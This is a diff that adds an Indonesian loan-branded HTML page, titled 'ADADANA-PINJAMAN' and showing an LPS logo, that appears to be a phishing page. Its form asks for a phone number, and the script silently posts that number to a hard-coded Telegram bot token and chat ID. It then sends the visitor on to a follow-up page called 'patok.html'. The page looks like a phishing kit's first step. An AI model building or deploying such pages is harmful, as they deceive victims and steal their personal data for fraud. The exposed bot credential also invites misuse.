@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ADADANA-PINJAMAN</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        .otp-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            margin-top: 3px;
+        }
+        
+        .gambar {
+            width: 100%;
+            margin-bottom: 0px;
+        }
+
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+            margin-bottom: 0px;
+        }
+
+        .otp-input {
+            display: flex;
+            align-items: center;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            padding: 0 10px;
+            width: 330px;
+            position: relative;
+        }
+
+        .otp-input img {
+            margin-right: 15px;
+            width:45px;
+        }
+
+        .otp-input input {
+            font-size: 14px;
+            padding: 10px;
+            text-align: left;
+            border: none;
+            outline: none;
+            font-weight: bold;
+            flex: 1;
+        }
+
+        .submit-btn {
+            background-color: #ccc;
+            color: #fff;
+            padding: 14px 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            font-size: 15px;
+            cursor: not-allowed;
+            margin-top: 15px;
+            width: 330px;
+        }
+
+        .submit-btn.enabled {
+            background-color: #ffa500;
+            cursor: pointer;
+        }
+
+        input[type="tel"] {
+            -moz-appearance: textfield;
+        }
+        
+        .gambar-bawah {
+            display: flex;
+            justify-content: center;
+            position: relative;
+            bottom: -10px;
+        }
+        .gambar-bawah img {
+            width: 85%;
+            object-fit: cover;
+            margin: 0 25px;
+            background:none;
+        }
+    </style>
+</head>
+<body>
+  
+  <div class="gambar">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEikHeyP8TDEp19IV_043vQTyV2amyaxgy-wzdPhp4smafg5WeozIY4aPCMm1pCYGBPZ5jKXI_Fx7wrqzn38BGadeln-gEatJa91PEXAbPY90g37340UpKgjsKq_QC7Qc2yaUzI5q7lLR1a4NfCsQ6odG074G1sGpxQNLJqcgDkZGAxofHco94Apa57WGFtO" alt="Gambar Pucok">
+    </div>
+
+<div class="otp-container">
+    <div class="otp-input">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgV0EjY5iIz6yi7cOg-0P85HvlR7_s8uLQrjO4_L9hhnqPuYHFl7JUG54W5ChLNenotsLdTOujHaq-LzNmtPsGs0oUiivocY0Lcwm4OY7VCmWPnN1J4nZAom1t7N_I7-XWj1T4Bo4IyDTrhiB7I1GLXsG9G1MUEvGbef65j8kHt8APITZjfg_fppPlAOCls" alt="Icon" width="24" height="24">
+        <input type="tel" id="phone" minlength="10" maxlength="13" placeholder="Masukan Nomor Telepon" oninput="checkPhone()">
+    </div>
+    <button class="submit-btn" id="submitBtn" disabled onclick="submitPhone()">Masuk</button>
+</div>
+
+<div class="gambar gambar-bawah">
+    <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjnPNIzk_aU0GDozpHAI9laHTUuZ18hlVYrEvo-KCopML2b4jOcnvkWyoAk-fxk9Sr8WEUaKov3uqMJ48seA8ltdf0JPaM4pSnXxfig8WNkDWKNh7nbVIXp-hFvfEXQqeZAAf9KP3wbMEvuOrlwIwsyT-NqhTyyd03QskLG71JVwxwTQVF-E4QYFM6f0Mwa" alt="Logo LPS">
+</div>
+
+<script>
+    // Function to check if phone number is valid
+    function checkPhone() {
+        const phoneInput = document.getElementById('phone').value;
+        if (phoneInput.length >= 10 && phoneInput.length <= 13 && /^\d+$/.test(phoneInput)) {
+            submitBtn.disabled = false;
+            submitBtn.classList.add('enabled');
+            submitBtn.style.cursor = 'pointer';
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.remove('enabled');
+            submitBtn.style.cursor = 'not-allowed';
+        }
+    }
+
+    // Function to submit phone number and send to Telegram
+    function submitPhone() {
+        const phoneInput = document.getElementById('phone').value;
+        const botToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48';  // Ganti dengan bot token Telegram Anda
+        const chatId = '6824078885';  // Ganti dengan chat ID Telegram Anda
+
+        // URL untuk mengirim pesan ke bot Telegram
+        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Pesan yang akan dikirim
+        const message = `Nomor Telepon: ${phoneInput}`;
+
+        // Kirim pesan ke Telegram
+        fetch(telegramURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Pesan terkirim ke Telegram:', data);
+
+            // Setelah pesan terkirim, redirect ke halaman patok.html
+            window.location.href = 'patok.html';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
+
+</body>
+</html>
